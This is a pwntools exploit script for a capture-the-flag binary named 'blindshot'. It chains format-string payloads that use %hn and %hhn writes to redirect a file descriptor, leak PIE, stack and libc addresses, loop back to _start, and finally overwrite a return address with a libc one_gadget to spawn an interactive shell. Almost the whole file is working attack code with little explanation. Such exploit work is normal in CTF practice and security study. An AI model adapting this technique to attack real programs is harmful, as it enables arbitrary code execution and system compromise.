#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./blindshot')
gdb.attach(p, 'b *0x55555555530b\n')

def pon(x, size):
    return ((x - 1) % (1<<(8*size))) + 1
 
if __name__ == "__main__":
  rsp = 0x7fffffffe5d0 # 0x7fffffffe5d0
  pos_argv = 5 + (0x7fffffffe638 - rsp) // 8 # 0x7fffffffe638 —▸ 0x7fffffffe718 —▸ 0x7fffffffe8fe ◂— '/ctf/work/blindshot'
  pos_argv0 = 5 + (0x7fffffffe718 - rsp) // 8 # 0x7fffffffe718 —▸ 0x7fffffffe8fe ◂— '/ctf/work/blindshot'
  pos_envp0 = 5 + (0x7fffffffe728 - rsp) // 8 #  0x7fffffffe728 —▸ 0x7fffffffe912 ◂— 'LESSOPEN=| /usr/bin/lesspipe %s'
  pos_retaddr = 5 + (0x7fffffffe628 - rsp) // 8 # 0x7fffffffe628 —▸ 0x7ffff7df30b3 (__libc_start_main+243) ◂— mov    edi, eax
  pos_stackaddr = 5
  pos_main = 5 + (0x7fffffffe648 - rsp) // 8 # 0x7fffffffe648 —▸ 0x55555555525c (main) ◂— endbr64

  payload  = ""
  cur = 0
  x = 0
  payload += "%c" * 3
  payload += "%{}c%hn".format(0xe340 - 3)     # change fd(0xe340 -> tmpfile->fd) == 1   (1)
  
  cur += 5
  x += 0xe340
  payload += "%c" * (pos_argv - cur - 2)
  payload += "%{}c%hn".format(0xe608 - x - (pos_argv - cur - 2))    # change main_ret (0xe608 -> main_ret)  (1)
  payload += "%{}c%{}$hhn".format(0x6F - 0x08, pos_argv0)           # change main_ret to `0x7fffffffe608 __ 0x7ffff7df306f (__libc_start_main+175)`
  payload += "%{}c%{}$hhn".format(0x101 - 0x6F, pos_envp0)          # change fd == 1
  payload += ".%{}$p".format(pos_main)
  payload += ".%{}$p".format(pos_stackaddr)
  payload += ".%{}$p.".format(pos_retaddr)
  p.sendlineafter(">", payload)
  # '''
  # %c%c%c%58205c%hn%c%c%c%c%c%c%c%c%c%c%c%701c%hn%71c%46$hhn%146c%48$hhn.%20$p.%5$p.%16$p.
  # '''
  p.recvuntil('.0x')
  pie = eval('0x' + p.recv(12)) - 0x125c
  stack = eval(p.recv(15)[1:])
  libc_base = eval(p.recv(15)[1:]) - 0x270b3
  success('PIE:  ' + str(hex(pie)))
  success('STACK:' + str(hex(stack)))
  success('LIBC: ' + str(hex(libc_base)))

  # ret to _start
  start = pie + 0x114c
  payload  = ""
  payload += "%c" * 3
  payload += "%{}c%hn".format(0xe5e8 - 3)     # stack(0xe5e8) -> service_ret
  x = 0xe5e8
  payload += "%{}c%{}$hn".format(pon((start & 0xffff) - x - 12, 2), pos_envp0)    # change service_ret to start
  p.sendlineafter("> ", payload)


  # get_shell
  one_gadget = libc_base + 0x54f89
  payload  = ""
  payload += "%c" * 3
  payload += "%{}c%hn".format(0xe508 - 3)     # stack(0xe508) -> main_ret
  x = 0xe508
  payload += "%c" * (0x2b)
  payload += "%{}c%hn".format(pon(0xe50a - x - 0x2b, 2))  # stack(0xe50a) -> main_ret
  x = 0xe50a
  payload += "%{}c%{}$hn".format(pon((one_gadget & 0xffff) - x, 2), 0x4b + 5)
  x = one_gadget & 0xffff
  payload += "%{}c%{}$hhn".format(pon(((one_gadget >> 16) - x) & 0xff, 1), 0x49 + 5)
  p.sendlineafter("> ", payload)

  p.interactive()